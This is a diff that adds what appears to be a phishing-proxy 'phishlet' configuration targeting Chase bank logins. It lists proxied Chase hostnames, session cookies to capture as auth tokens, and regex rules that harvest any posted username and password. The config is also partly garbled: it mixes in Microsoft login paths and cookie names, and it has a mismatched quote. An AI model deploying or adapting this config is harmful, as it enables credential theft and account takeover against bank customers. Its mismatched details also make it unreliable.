@@ -1,0 +1,35 @@
+sub_filters:
+
+  - {triggers_on: 'secure01b.chase.com', orig_sub: 'secure01b', domain: 'chase.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'www.chase.com', orig_sub: 'www', domain: 'chase.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+
+  - domain: 'secure01b.chase.com'
+
+    keys: ['WLSSC','aggregator-oauth/mobile/authorize','RPSSecAuth']
+
+credentials:
+
+  username:
+
+    key: 'username'
+
+    search: '(.*)'
+
+    type: 'post'
+
+  password:
+
+    key: ‘password'
+
+    search: '(.*)'
+
+    type: 'post'
+
+login:
+
+  domain: 'secure01b.chase.com'
+
+  path: '/web/auth/dashboard/'
